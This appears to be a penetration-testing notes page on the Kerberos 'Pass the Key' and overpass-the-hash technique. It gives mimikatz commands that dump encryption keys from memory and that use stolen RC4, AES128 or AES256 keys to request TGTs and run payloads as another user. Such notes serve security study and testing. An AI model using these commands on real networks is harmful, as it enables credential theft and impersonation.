---
title: Pass The Key
---

When a User Requests a **TGT**, they send a Timestamp Encrypted with an Encryption Key derived from their Password. 

The Algorithm used to derive this Key can be either **`DES` - `RC4` - `AES128` - `AES256`**, depending on the installed Windows Version and Kerberos Configuration. If we have any of those Keys, we can ask the **KDC** for a **TGT** without requiring the actual Password.

<br/>

```batch
:: Obtaining Kerberos Encryption Keys
privilege::debug
sekurlsa::ekeys
```

<br/>

### Format

Depending on the **Available `Keys`**, we can run the following Commands on **`mimikatz`**.

<br/>

:::caution RC4 [Overpass-the-Hash]

When using `RC4` the Key will be Equal to the **NTLM Hash** of a **User**. 

This means that if we could extract the **NTLM Hash**, we can use it to request a **TGT** as long as **RC4** is one of the Enabled Protocols.

:::



```batch
:: RC4
sekurlsa::pth /user:USERNAME /domain:TARGET /rc4:HASH /run:"Command/PAYLOAD To Run"
```

<br/>

```batch
:: AES128
sekurlsa::pth /user:USERNAME /domain:TARGET /aes128:HASH /run:"Command/PAYLOAD To Run"
```

```batch
:: AES256
sekurlsa::pth /user:USERNAME /domain:TARGET /aes256:HASH /run:"Command/PAYLOAD To Run"
```